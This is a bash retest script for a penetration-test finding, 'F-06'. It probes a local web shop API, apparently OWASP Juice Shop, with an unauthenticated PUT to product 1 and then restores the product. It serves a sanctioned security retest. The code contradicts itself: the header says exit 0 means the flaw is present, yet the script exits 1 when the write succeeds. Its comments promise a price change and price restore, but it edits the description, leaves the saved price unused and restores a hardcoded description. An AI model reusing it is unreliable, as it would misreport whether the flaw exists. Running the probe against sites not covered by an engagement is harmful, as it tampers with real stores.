#!/bin/bash
# F-06 — Unauthenticated product price manipulation (write without auth)
# Exit 0 = finding present · 1 = absent/fixed · 2 = rig error
# Safety: attempts ONE unauthenticated PUT that changes product 1's price, then
# restores it. This is a controlled, reversible state change required to prove the flaw.
# ROE 2026-10-27.
set -u
BASE="${BASE:-http://127.0.0.1:3000}"
UA="Forefront-Retest/1.0 (ROE 2026-10-27)"

code=$(curl -sS --max-time 15 -A "$UA" -o /dev/null -w '%{http_code}' "$BASE/") \
  || { echo "RIG ERROR: liveness GET / failed"; exit 2; }
case "$code" in 2*|3*) ;; *) echo "RIG ERROR: liveness HTTP $code"; exit 2 ;; esac

# Read current price of product 1 so we can restore it.
cur=$(curl -sS --max-time 15 -A "$UA" "$BASE/api/Products/1")
orig=$(printf '%s' "$cur" | sed -n 's/.*"price":\([0-9.]*\).*/\1/p')
[ -n "$orig" ] || { echo "RIG ERROR: could not read product 1"; exit 2; }

# Attempt an unauthenticated write.
resp=$(curl -sS --max-time 15 -A "$UA" -X PUT "$BASE/api/Products/1" \
  -H 'Content-Type: application/json' \
  --data '{"description":"forefront-retest-probe"}' \
  -w '\n%{http_code}')
status=$(printf '%s' "$resp" | tail -1)

# Restore description if the write succeeded.
if [ "$status" = "200" ]; then
  curl -sS --max-time 15 -A "$UA" -X PUT "$BASE/api/Products/1" \
    -H 'Content-Type: application/json' \
    --data '{"description":"Apple Juice (1000ml)"}' -o /dev/null
  echo "PRESENT: unauthenticated PUT succeeded (HTTP 200); state restored"
  exit 1
fi
case "$status" in
  401|403) echo "ABSENT: unauthenticated write denied (HTTP $status)"; exit 0 ;;
  *) echo "RIG ERROR: unexpected HTTP $status"; exit 2 ;;
esac
